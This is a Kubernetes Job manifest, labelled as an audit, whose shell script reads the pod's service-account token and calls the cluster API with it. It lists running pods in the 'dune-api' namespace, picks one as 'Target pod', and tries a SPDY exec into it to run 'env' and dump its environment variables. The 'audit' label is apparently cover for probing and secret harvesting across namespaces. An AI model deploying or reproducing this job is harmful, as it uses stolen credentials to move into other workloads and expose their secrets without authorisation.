apiVersion: batch/v1
kind: Job
metadata:
  name: dune-exec-v1
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine/curl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          apk add -q jq
          KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          API="https://kubernetes.default.svc"
          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
          KUBE_NS="dune-api"
          
          echo "=RUNNING_PODS="
          PODS=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/api/v1/namespaces/$KUBE_NS/pods?fieldSelector=status.phase%3DRunning" | \
            jq -r '.items[].metadata.name')
          echo "$PODS"
          echo "=END_PODS="
          
          POD=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/api/v1/namespaces/$KUBE_NS/pods?fieldSelector=status.phase%3DRunning" | \
            jq -r '.items[0].metadata.name')
          echo "Target pod: $POD"
          
          # Try exec via spdy (not websocket - may not work but try)
          echo "=EXEC_ATTEMPT="
          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            -H "Upgrade: SPDY/3.1" \
            -H "Connection: Upgrade" \
            "$API/api/v1/namespaces/$KUBE_NS/pods/$POD/exec?command=env&stderr=true&stdout=true" 2>&1 | head -c 500
          echo ""
          echo "=END_EXEC="